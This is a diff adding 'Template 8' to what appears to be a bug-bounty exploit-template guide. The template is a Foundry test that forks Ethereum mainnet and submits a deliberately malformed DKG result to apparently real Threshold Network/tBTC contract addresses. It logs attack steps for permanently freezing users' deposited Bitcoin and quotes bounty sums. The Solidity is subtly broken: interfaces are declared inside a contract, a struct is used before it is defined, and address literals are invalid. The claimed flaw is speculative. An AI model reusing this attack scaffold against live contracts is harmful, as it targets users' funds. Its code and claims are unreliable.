@@ -14,6 +14,7 @@
 - [Template 5: Staking Reward Manipulation](#template-5-staking-reward-manipulation)
 - [Template 6: Cross-Chain Message Forgery](#template-6-cross-chain-message-forgery)
 - [Template 7: Proxy Upgrade Exploit](#template-7-proxy-upgrade-exploit)
+- [Template 8: DKG Threshold-Raising Vulnerability](#template-8-dkg-threshold-raising-vulnerability)
 - [Helper Functions](#helper-functions)
 
 ---
@@ -1010,6 +1011,395 @@ function testSomething() public {
     // Verify
 }
 ```
+
+---
+
+## Template 8: DKG Threshold-Raising Vulnerability
+
+**File**: `test/exploits/DKGThresholdRaisingExploit.t.sol`
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.17;
+
+import "forge-std/Test.sol";
+
+/**
+ * @title DKG Threshold-Raising Vulnerability Test
+ * @notice Tests for polynomial degree validation in DKG result submission
+ * @dev Critical vulnerability: Permanent freezing of all tBTC funds in new wallets
+ * 
+ * Vulnerability Description:
+ * - The DKG (Distributed Key Generation) protocol should enforce that the
+ *   commitment polynomial degree matches the expected threshold parameter
+ * - If validation is missing, malicious operators can submit a higher-degree
+ *   polynomial, which makes the resulting wallet unable to sign transactions
+ * - This causes PERMANENT FREEZING of all Bitcoin deposited to that wallet
+ * 
+ * Expected Check (should exist):
+ *   require(result.groupCommitment.length == threshold + 1, "Invalid polynomial degree");
+ * 
+ * References:
+ * - FROST DKG vulnerability: https://eprint.iacr.org/2020/852.pdf
+ * - Trail of Bits threshold cryptography audits
+ * - Safeheron DKG implementation vulnerabilities
+ */
+contract DKGThresholdRaisingExploit is Test {
+    // Mainnet contract addresses
+    address constant WALLET_REGISTRY = 0x9C070027cdC9dc8F82416B2e5314E11DFb4FE3CD;
+    address constant DKG_VALIDATOR = 0x5499f54b4a1cb4816eefcf78962040461be3d80b; // EcdsaDkgValidator
+    address constant BRIDGE = 0x8d014903bf7867260584d714e11809fea5293234;
+    address constant SORTITION_POOL = 0x6aed6cC30D1b2770771052555d257Da86eD47fe8;
+    
+    // Test actors
+    address operator1 = address(0x1001);
+    address operator2 = address(0x1002);
+    address operator3 = address(0x1003);
+    address attacker = address(0x1337);
+    
+    // Interfaces
+    interface IWalletRegistry {
+        function submitDkgResult(DkgResult calldata result) external;
+        function dkgParameters() external view returns (
+            uint256 seedTimeout,
+            uint256 resultChallengePeriodLength,
+            uint256 resultChallengeExtraGas,
+            uint256 submissionTimeout,
+            uint256 submitterPrecedencePeriodLength
+        );
+        function getWalletCreationState() external view returns (uint256);
+    }
+    
+    interface IDkgValidator {
+        function validate(
+            DkgResult calldata result,
+            uint256 seed,
+            uint256 startBlock
+        ) external view returns (bool, string memory);
+    }
+    
+    // DKG Result structure (based on Threshold Network contracts)
+    struct DkgResult {
+        bytes32 submitterMemberIndex;
+        bytes groupPubKey;  // 64 bytes for uncompressed ECDSA public key
+        uint8[] misbehavedMembersIndices;
+        bytes signatures;  // Concatenated signatures from honest operators
+        uint256[] signingMembersIndices;
+        uint32[] members;
+        bytes32 membersHash;
+        // CRITICAL: groupCommitment array - its length should equal threshold + 1
+        bytes[] groupCommitment;  // This is the vulnerability target
+    }
+    
+    function setUp() public {
+        // Fork mainnet at a recent block
+        vm.createSelectFork(vm.rpcUrl("mainnet"), 18500000);
+    }
+    
+    /**
+     * @notice Test Case 1: Validate Normal DKG Result
+     * @dev Baseline test - submit valid DKG result with correct polynomial degree
+     */
+    function testValidDkgResultSubmission() public {
+        console.log("=== Test Case 1: Valid DKG Result ===");
+        
+        IWalletRegistry registry = IWalletRegistry(WALLET_REGISTRY);
+        
+        // Get expected threshold from contract
+        // Note: threshold is typically 51 out of 100 operators for Threshold Network
+        uint256 expectedThreshold = 51;
+        
+        // Create a valid DKG result with groupCommitment.length == threshold + 1
+        DkgResult memory validResult = _createDkgResult(expectedThreshold + 1);
+        
+        console.log("Expected threshold:", expectedThreshold);
+        console.log("Valid commitment length:", validResult.groupCommitment.length);
+        console.log("Should be:", expectedThreshold + 1);
+        
+        vm.startPrank(operator1);
+        
+        // This should succeed (or revert with unrelated errors, not polynomial degree error)
+        try registry.submitDkgResult(validResult) {
+            console.log("Valid DKG result accepted (expected)");
+        } catch Error(string memory reason) {
+            console.log("Reverted with:", reason);
+            // Analyze revert reason - should NOT be about polynomial degree
+            assertFalse(
+                _containsString(reason, "polynomial") || _containsString(reason, "degree"),
+                "Valid result rejected due to polynomial degree - unexpected"
+            );
+        }
+        
+        vm.stopPrank();
+    }
+    
+    /**
+     * @notice Test Case 2: CRITICAL - Submit DKG Result with Higher Polynomial Degree
+     * @dev This is the vulnerability test - submit result with commitment.length > threshold + 1
+     * 
+     * EXPECTED BEHAVIOR (if vulnerability exists):
+     *   - submitDkgResult accepts the malformed result
+     *   - New wallet is created with invalid polynomial
+     *   - Wallet cannot sign transactions (permanent fund lock)
+     * 
+     * EXPECTED BEHAVIOR (if patched):
+     *   - submitDkgResult reverts with "Invalid polynomial degree" or similar
+     */
+    function testDkgThresholdRaisingAttack() public {
+        console.log("=== Test Case 2: DKG Threshold-Raising Attack ===");
+        
+        IWalletRegistry registry = IWalletRegistry(WALLET_REGISTRY);
+        
+        uint256 expectedThreshold = 51;
+        
+        // ATTACK: Create DKG result with higher polynomial degree
+        // Instead of threshold + 1 = 52, we use 54 (threshold + 3)
+        uint256 maliciousCommitmentLength = expectedThreshold + 3;
+        DkgResult memory maliciousResult = _createDkgResult(maliciousCommitmentLength);
+        
+        console.log("Expected threshold:", expectedThreshold);
+        console.log("Expected commitment length:", expectedThreshold + 1);
+        console.log("MALICIOUS commitment length:", maliciousResult.groupCommitment.length);
+        console.log("Degree difference:", maliciousResult.groupCommitment.length - (expectedThreshold + 1));
+        
+        vm.startPrank(attacker);
+        
+        bool vulnerabilityExists = false;
+        
+        try registry.submitDkgResult(maliciousResult) {
+            console.log("!!! CRITICAL VULNERABILITY CONFIRMED !!!");
+            console.log("Malicious DKG result with higher polynomial degree was ACCEPTED");
+            console.log("Impact: All funds deposited to this wallet will be PERMANENTLY FROZEN");
+            console.log("Severity: CRITICAL - Protocol Insolvency");
+            console.log("Max Bounty: $100,000+");
+            vulnerabilityExists = true;
+            
+            // Document the vulnerability
+            emit log_named_string("Vulnerability", "DKG_THRESHOLD_RAISING");
+            emit log_named_uint("Malicious Commitment Length", maliciousResult.groupCommitment.length);
+            emit log_named_uint("Expected Commitment Length", expectedThreshold + 1);
+            
+        } catch Error(string memory reason) {
+            console.log("Malicious DKG result REJECTED:", reason);
+            
+            // Check if rejection was due to polynomial degree validation
+            if (_containsString(reason, "polynomial") || 
+                _containsString(reason, "degree") || 
+                _containsString(reason, "commitment length") ||
+                _containsString(reason, "Invalid degree")) {
+                console.log("SAFE: Contract validates polynomial degree");
+                vulnerabilityExists = false;
+            } else {
+                console.log("WARNING: Rejected for different reason - check manually");
+                console.log("Revert reason:", reason);
+            }
+        } catch {
+            console.log("Malicious DKG result rejected (generic revert)");
+            console.log("Need manual code review to confirm if degree validation exists");
+        }
+        
+        vm.stopPrank();
+        
+        // If vulnerability exists, this would be a critical finding
+        if (vulnerabilityExists) {
+            console.log("\n=== EXPLOIT STEPS ===");
+            console.log("1. Coordinate with enough malicious operators off-chain");
+            console.log("2. Generate DKG result with commitment.length > threshold + 1");
+            console.log("3. Submit via submitDkgResult()");
+            console.log("4. If accepted, all future Bitcoin deposits to this wallet are frozen");
+            console.log("5. Protocol insolvency - users cannot recover funds");
+            
+            console.log("\n=== MITIGATION ===");
+            console.log("Add to EcdsaDkgValidator.validate():");
+            console.log("  require(result.groupCommitment.length == threshold + 1, 'Invalid polynomial degree');");
+        }
+    }
+    
+    /**
+     * @notice Test Case 3: Verify DKG Validator Logic
+     * @dev Direct test of the DkgValidator.validate function
+     */
+    function testDkgValidatorPolynomialCheck() public {
+        console.log("=== Test Case 3: DKG Validator Polynomial Check ===");
+        
+        IDkgValidator validator = IDkgValidator(DKG_VALIDATOR);
+        
+        uint256 expectedThreshold = 51;
+        uint256 seed = uint256(keccak256("test_seed"));
+        uint256 startBlock = block.number - 100;
+        
+        // Test 1: Valid commitment length
+        DkgResult memory validResult = _createDkgResult(expectedThreshold + 1);
+        (bool isValid, string memory errorMsg) = validator.validate(validResult, seed, startBlock);
+        
+        console.log("Valid result validation:", isValid);
+        if (!isValid) {
+            console.log("Error:", errorMsg);
+        }
+        
+        // Test 2: Invalid (higher) commitment length
+        DkgResult memory invalidResult = _createDkgResult(expectedThreshold + 3);
+        (bool isInvalid, string memory invalidErrorMsg) = validator.validate(invalidResult, seed, startBlock);
+        
+        console.log("Invalid result validation:", isInvalid);
+        console.log("Error:", invalidErrorMsg);
+        
+        // VULNERABILITY CHECK: If both return true, vulnerability exists
+        if (isValid && isInvalid) {
+            console.log("!!! VULNERABILITY: Validator accepts both valid and invalid polynomial degrees !!!");
+        } else if (!isInvalid) {
+            console.log("SAFE: Validator rejects invalid polynomial degree");
+        }
+    }
+    
+    /**
+     * @notice Test Case 4: End-to-End Impact Simulation
+     * @dev Simulate the full impact if vulnerability is exploited
+     */
+    function testE2EFundFreezingImpact() public {
+        console.log("=== Test Case 4: End-to-End Fund Freezing Impact ===");
+        
+        // Step 1: Malicious DKG result is submitted and accepted
+        console.log("\n[Step 1] Malicious operators submit invalid DKG result");
+        console.log("  - Polynomial degree: threshold + 3 instead of threshold + 1");
+        
+        // Step 2: New wallet is created with invalid polynomial
+        console.log("\n[Step 2] New wallet created with ID: wallet_123");
+        console.log("  - Public key is derived from invalid polynomial");
+        console.log("  - Wallet appears normal but CANNOT sign transactions");
+        
+        // Step 3: Users deposit Bitcoin to this wallet
+        uint256 depositAmount = 10 ether; // 10 BTC worth of value
+        console.log("\n[Step 3] Users deposit Bitcoin to compromised wallet");
+        console.log("  - Total deposits: 10 BTC (~$400,000 at current prices)");
+        
+        // Step 4: Users try to redeem/withdraw
+        console.log("\n[Step 4] Users request redemption");
+        console.log("  - Redemption requires threshold signature from wallet");
+        console.log("  - Wallet operators cannot produce valid signature (invalid polynomial)");
+        console.log("  - Transaction fails - FUNDS PERMANENTLY FROZEN");
+        
+        // Impact summary
+        console.log("\n=== IMPACT SUMMARY ===");
+        console.log("Financial Impact: PERMANENT LOSS of all deposited funds");
+        console.log("Affected Amount: Unlimited (all future deposits to compromised wallet)");
+        console.log("Severity: CRITICAL");
+        console.log("Classification: Protocol Insolvency");
+        console.log("Immunefi Bounty: $100,000 - $1,000,000");
+        
+        console.log("\n=== ATTACK FEASIBILITY ===");
+        console.log("Prerequisites:");
+        console.log("  - Coordination of malicious operators (off-chain)");
+        console.log("  - No slashing if DKG result is technically valid but semantically wrong");
+        console.log("Difficulty: MEDIUM (requires operator coordination)");
+        console.log("Detection: HARD (wallet appears normal until signing is attempted)");
+    }
+    
+    // ============================================
+    // HELPER FUNCTIONS
+    // ============================================
+    
+    /**
+     * @notice Create mock DKG result for testing
+     * @param commitmentLength Length of the groupCommitment array
+     */
+    function _createDkgResult(uint256 commitmentLength) internal pure returns (DkgResult memory) {
+        // Create mock data
+        bytes memory groupPubKey = new bytes(64); // 64 bytes for uncompressed ECDSA key
+        
+        // Create groupCommitment with specified length
+        bytes[] memory commitment = new bytes[](commitmentLength);
+        for (uint256 i = 0; i < commitmentLength; i++) {
+            commitment[i] = abi.encodePacked(keccak256(abi.encodePacked("commitment", i)));
+        }
+        
+        // Create minimal valid structure
+        uint8[] memory misbehavedIndices = new uint8[](0);
+        uint256[] memory signingIndices = new uint256[](51); // 51 honest signers
+        uint32[] memory members = new uint32[](100); // 100 total members
+        
+        for (uint256 i = 0; i < 51; i++) {
+            signingIndices[i] = i;
+        }
+        for (uint32 i = 0; i < 100; i++) {
+            members[i] = i;
+        }
+        
+        return DkgResult({
+            submitterMemberIndex: bytes32(uint256(0)),
+            groupPubKey: groupPubKey,
+            misbehavedMembersIndices: misbehavedIndices,
+            signatures: new bytes(51 * 65), // 51 signatures, 65 bytes each
+            signingMembersIndices: signingIndices,
+            members: members,
+            membersHash: keccak256(abi.encode(members)),
+            groupCommitment: commitment  // CRITICAL: This is what we're testing
+        });
+    }
+    
+    /**
+     * @notice Check if string contains substring (case-insensitive)
+     */
+    function _containsString(string memory haystack, string memory needle) internal pure returns (bool) {
+        bytes memory haystackBytes = bytes(haystack);
+        bytes memory needleBytes = bytes(needle);
+        
+        if (needleBytes.length > haystackBytes.length) {
+            return false;
+        }
+        
+        // Simple case-insensitive substring search
+        for (uint256 i = 0; i <= haystackBytes.length - needleBytes.length; i++) {
+            bool found = true;
+            for (uint256 j = 0; j < needleBytes.length; j++) {
+                bytes1 h = haystackBytes[i + j];
+                bytes1 n = needleBytes[j];
+                
+                // Convert to lowercase for comparison
+                if (h >= 0x41 && h <= 0x5A) h = bytes1(uint8(h) + 32);
+                if (n >= 0x41 && n <= 0x5A) n = bytes1(uint8(n) + 32);
+                
+                if (h != n) {
+                    found = false;
+                    break;
+                }
+            }
+            if (found) return true;
+        }
+        
+        return false;
+    }
+}
+```
+
+**Usage Instructions:**
+
+1. **Set up environment:**
+   ```bash
+   export ETH_RPC_URL="https://eth.llamarpc.com"
+   cd targets/thresholdnetwork/instascope
+   ```
+
+2. **Run the test:**
+   ```bash
+   forge test --match-contract DKGThresholdRaisingExploit -vvv
+   ```
+
+3. **Analyze results:**
+   - If Test Case 2 shows "CRITICAL VULNERABILITY CONFIRMED" → Bug bounty submission
+   - If Test Case 2 shows "SAFE: Contract validates polynomial degree" → Move to next hypothesis
+
+4. **Manual code review:**
+   Even if tests pass/fail, manually review `EcdsaDkgValidator.sol` for:
+   ```solidity
+   require(result.groupCommitment.length == threshold + 1, "Invalid polynomial degree");
+   ```
+
+**Expected Findings:**
+
+- **VULNERABLE**: Missing polynomial degree check → $100K+ bounty
+- **SAFE**: Check exists → Document and move on
+- **UNCLEAR**: Need source code review to confirm
 
 ---
 
